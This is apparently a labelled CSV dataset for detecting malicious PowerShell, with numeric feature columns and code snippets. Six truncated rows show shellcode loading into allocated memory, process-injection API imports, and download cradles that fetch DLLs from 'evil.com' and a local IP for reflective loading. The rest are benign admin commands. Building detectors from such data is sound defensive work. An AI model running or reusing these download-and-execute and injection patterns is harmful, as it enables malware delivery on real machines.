code_length,line_count,avg_line_length,entropy,amsi_keyword_count,has_amsi_keyword,win32_api_count,has_virtualprotect,has_getprocaddress,has_loadlibrary,reflection_count,has_reflection,marshal_op_count,backtick_count,has_format_operator,char_cast_count,string_concat_count,plus_operator_density,has_base64,has_memory_patch_pattern,hex_byte_array,has_page_rwx,dllimport_count,has_add_type,has_registry_amsi,has_ps_downgrade,has_scriptblock_ast,has_hw_breakpoint,has_etw_tamper,has_download_cradle,has_clr_targeting,special_char_ratio,case_ratio,composite_risk,callstack_amsi_dll_present,callstack_clr_to_kernel,callstack_ntdll_direct,callstack_wow64_transition,callstack_syscall_direct,callstack_reflection_depth,proc_spawns_cmd,proc_parent_spoofing,proc_inject_remote,proc_hollow_indicators,proc_runs_from_temp,proc_unusual_parent,mem_page_rwx,mem_page_rx_after_rw,mem_alloc_exec,mem_write_then_exec,mem_unbacked_region,mem_patch_size_small,bseq_load_reflect_exec,bseq_obfuscate_then_exec,bseq_download_then_exec,bseq_patch_amsi_then_run,bseq_etw_disable_then_run,bseq_clr_tamper,bseq_multi_evasion,dynamic_risk_score,label,label_name,source_id,raw_code_snippet
519,1,519.0,5.273046609019563,0,0,1,1,0,0,0,0,1,0,0,0,0,0.0,0,1,1,1,1,1,0,0,0,0,0,0,0,0.1926782273603083,0.16408668730650156,14,0,0,0,0,0,1,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,5,1,AMSI_Bypass,MAL-047,"[byte[]]$sc=0x4D,0x5A,0x90,0x00,0xFC,0x48; $mem=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length); [Sys"
191,1,191.0,5.099266433146937,0,0,0,0,0,0,2,1,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.2617801047120419,0.15966386554621848,4,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,5,1,AMSI_Bypass,MAL-048,$bytes=(New-Object Net.WebClient).DownloadData('http://evil.com/payload.dll'); $asm=[System.Reflection.Assembly]::Load($
305,1,305.0,4.977866674301278,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,1,1,1,1,0,0,0,0,0,0,0,0.18688524590163935,0.24561403508771928,5,0,0,1,1,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,18,1,AMSI_Bypass,MAL-049,"Add-Type -MemberDefinition '[DllImport(""ntdll"")] public static extern int NtCreateThread(out IntPtr h,uint a,IntPtr oa,I"
630,1,630.0,5.226539297013796,0,0,1,1,0,0,0,0,1,0,0,0,0,0.0,0,1,1,1,3,1,0,0,0,0,0,0,0,0.19682539682539682,0.16752577319587628,18,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,5,1,AMSI_Bypass,MAL-050,"Add-Type -MemberDefinition '[DllImport(""kernel32"")] public static extern IntPtr CreateFiber(uint s,IntPtr f,IntPtr p); ["
249,1,249.0,5.173213598078091,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,1,1,0,0,0,0,0,0,0,0.1686746987951807,0.23178807947019867,2,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,1,AMSI_Bypass,MAL-051,"$handle=OpenProcess(0x1F0FFF,$false,$pid); Add-Type -MemberDefinition '[DllImport(""kernel32"")] public static extern bool"
561,1,561.0,5.316962123179277,0,0,1,0,0,0,0,0,1,0,0,0,0,0.0017825311942959,0,0,1,1,1,1,0,0,0,0,0,0,0,0.2014260249554367,0.16138328530259366,9,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,5,1,AMSI_Bypass,MAL-052,$bytes=(New-Object Net.WebClient).DownloadData('http://192.168.1.1/reflective.dll'); Add-Type -MemberDefinition '[DllImp
67,1,67.0,4.31259749709413,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.1044776119402985,0.28205128205128205,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-001,Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
52,1,52.0,4.531768565580187,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.21153846153846154,0.2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-002,Get-Service | Where-Object {$_.Status -eq 'Running'}
39,1,39.0,4.047846769977879,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.07692307692307693,0.30434782608695654,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-003,Get-EventLog -LogName System -Newest 50
75,1,75.0,4.551612691271604,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.08,0.22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-004,"Get-WmiObject -Class Win32_OperatingSystem | Select-Object Caption, Version"
67,1,67.0,4.603163631786077,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.05970149253731343,0.20408163265306123,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-005,"Get-ComputerInfo | Select-Object WindowsProductName, OsArchitecture"
52,1,52.0,4.302919824620763,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.19230769230769232,0.34615384615384615,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-006,systeminfo | findstr /B /C:'OS Name' /C:'OS Version'
64,1,64.0,4.782963821688583,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.140625,0.23076923076923078,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-007,Get-ChildItem C:\Windows\System32 -Filter *.dll | Measure-Object
48,1,48.0,4.377167324657884,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.08333333333333333,0.25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-008,Get-HotFix | Sort-Object InstalledOn -Descending
65,1,65.0,4.494316850990732,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.09230769230769231,0.23255813953488372,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-009,"Get-Disk | Select-Object Number, FriendlyName, Size, HealthStatus"
54,1,54.0,4.24932778093851,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.09259259259259259,0.2571428571428571,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-010,"Get-NetAdapter | Select-Object Name, Status, LinkSpeed"
54,1,54.0,4.342282410728398,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.09259259259259259,0.2571428571428571,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-011,"Get-LocalUser | Select-Object Name, Enabled, LastLogon"
48,1,48.0,4.371115365169272,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.08333333333333333,0.21212121212121213,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-012,"Get-LocalGroup | Select-Object Name, Description"
44,1,44.0,4.280470187252587,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.09090909090909091,0.1875,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-013,Get-LocalGroupMember -Group 'Administrators'
12,1,12.0,3.418295834054489,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.08333333333333333,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-014,whoami /priv
8,1,8.0,2.75,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-015,net user
29,1,29.0,3.8573068568981284,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-016,net localgroup administrators
75,1,75.0,4.282840865134893,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.08,0.2978723404255319,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-017,"Get-ADUser -Filter * -Properties LastLogonDate | Select Name, LastLogonDate"
77,1,77.0,4.565061625409204,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.12987012987012986,0.2608695652173913,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-018,"Get-ChildItem -Path C:\Users -Recurse -Filter *.log | Select FullName, Length"
58,1,58.0,4.575159822818812,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.1724137931034483,0.15789473684210525,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-019,Copy-Item -Path C:\temp\config.xml -Destination C:\backup\
38,1,38.0,4.113206053476118,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.21052631578947367,0.22727272727272727,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-020,Remove-Item -Path C:\temp\*.tmp -Force
56,1,56.0,4.430222502793967,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.10714285714285714,0.2777777777777778,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-021,New-Item -ItemType Directory -Path C:\Projects\NewFolder
68,1,68.0,4.515494414932971,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.1323529411764706,0.1956521739130435,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-022,Compress-Archive -Path C:\Logs -DestinationPath C:\Archives\logs.zip
49,1,49.0,4.230047161830223,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.14285714285714285,0.14705882352941177,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-023,Get-Content C:\Windows\System32\drivers\etc\hosts
37,1,37.0,4.499597622210292,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.16216216216216217,0.21739130434782608,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-024,Test-Path C:\Windows\System32\cmd.exe
62,1,62.0,4.836709011755515,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.11290322580645161,0.2702702702702703,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-025,Get-FileHash C:\Windows\System32\notepad.exe -Algorithm SHA256
41,1,41.0,4.63780139475645,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.14634146341463414,0.30434782608695654,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-026,Get-Acl C:\Windows\System32 | Format-List
53,1,53.0,4.1989475783432475,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.07547169811320754,0.16666666666666666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-027,Test-NetConnection -ComputerName google.com -Port 443
26,1,26.0,3.7773627950641684,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.07692307692307693,0.15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-028,Resolve-DnsName google.com
59,1,59.0,4.402978219766114,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.1016949152542373,0.2631578947368421,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-029,Get-NetTCPConnection | Where-Object State -eq 'Established'
22,1,22.0,3.8796640049025934,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.045454545454545456,0.3125,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-030,Get-NetIPConfiguration
17,1,17.0,2.939829017466402,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.23529411764705882,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-031,ping -n 4 8.8.8.8
18,1,18.0,3.3502090290998976,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.05555555555555555,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-032,tracert google.com
22,1,22.0,3.6589934152538053,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.045454545454545456,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-033,nslookup microsoft.com
34,1,34.0,4.24173085589259,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.058823529411764705,0.6470588235294118,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-034,netstat -ano | findstr ESTABLISHED
13,1,13.0,3.3927474104487847,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.07692307692307693,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-035,ipconfig /all
6,1,6.0,2.2516291673878226,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.16666666666666666,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-036,arp -a
81,1,81.0,4.618861232313541,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.13580246913580246,0.19607843137254902,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-037,Get-Counter '\Processor(_Total)\% Processor Time' -SampleInterval 2 -MaxSamples 5
82,1,82.0,4.774775102433179,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.13414634146341464,0.27906976744186046,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-038,"Get-Process | Where-Object {$_.WorkingSet64 -gt 100MB} | Select Name, WorkingSet64"
68,1,68.0,4.504773003856491,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.07352941176470588,0.30952380952380953,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-039,"Get-CimInstance Win32_LogicalDisk | Select DeviceID, FreeSpace, Size"
73,1,73.0,4.501353586740548,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.1643835616438356,0.23255813953488372,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-040,Get-ScheduledTask | Where-Object {$_.State -eq 'Ready'} | Select TaskName
29,1,29.0,3.8404025467025056,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.13793103448275862,0.21052631578947367,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-041,Start-Service -Name 'Spooler'
35,1,35.0,3.85416328885666,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.14285714285714285,0.22727272727272727,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-042,Stop-Service -Name 'Spooler' -Force
32,1,32.0,3.9025182662886326,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.125,0.13043478260869565,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-043,Restart-Service -Name 'wuauserv'
50,1,50.0,4.105979129983101,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.1,0.20588235294117646,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-044,Set-Service -Name 'Spooler' -StartupType Automatic
45,1,45.0,4.444754974579371,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.06666666666666667,0.2962962962962963,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-045,Get-WinEvent -LogName Security -MaxEvents 100
72,1,72.0,4.761269751406731,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.1527777777777778,0.2619047619047619,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-046,Get-WinEvent -FilterHashtable @{LogName='System'; Level=2} -MaxEvents 20
34,1,34.0,3.981296944943374,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.11764705882352941,0.043478260869565216,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-047,wevtutil qe Security /c:10 /f:text
48,1,48.0,4.344841929151772,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.08333333333333333,0.21875,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-048,"Get-Module -ListAvailable | Select Name, Version"
25,1,25.0,3.9434651896016457,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.08,0.2222222222222222,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-049,Get-ExecutionPolicy -List
68,1,68.0,4.2655867905257505,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.04411764705882353,0.19607843137254902,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-050,Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
15,1,15.0,3.7735572622751845,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.06666666666666667,0.4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-051,$PSVersionTable
26,1,26.0,3.7192945256669785,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.11538461538461539,0.3125,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-052,Get-Help Get-Process -Full
43,1,43.0,4.437210684632777,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.20930232558139536,0.13043478260869565,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-053,"dir C:\Windows\System32 /s /b | find "".exe"""
13,1,13.0,3.180832987205441,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.07692307692307693,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-054,tasklist /svc
24,1,24.0,4.1053885422075345,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.08333333333333333,0.26666666666666666,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-055,schtasks /query /fo LIST
23,1,23.0,3.6424896731661263,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-056,wmic process list brief
60,1,60.0,4.650489295854282,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.08333333333333333,0.4722222222222222,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-057,reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
37,1,37.0,4.371087149178846,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.10810810810810811,0.17391304347826086,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-058,certutil -hashfile C:\file.txt SHA256
29,1,29.0,4.064203408622267,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.034482758620689655,0.17391304347826086,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-059,Import-Module ActiveDirectory
55,1,55.0,4.389917440561371,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.09090909090909091,0.2571428571428571,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-060,"Get-ADComputer -Filter * | Select Name, OperatingSystem"
64,1,64.0,4.544758938909887,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.09375,0.18181818181818182,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Benign,BEN-061,Invoke-Command -ComputerName server01 -ScriptBlock {Get-Process}
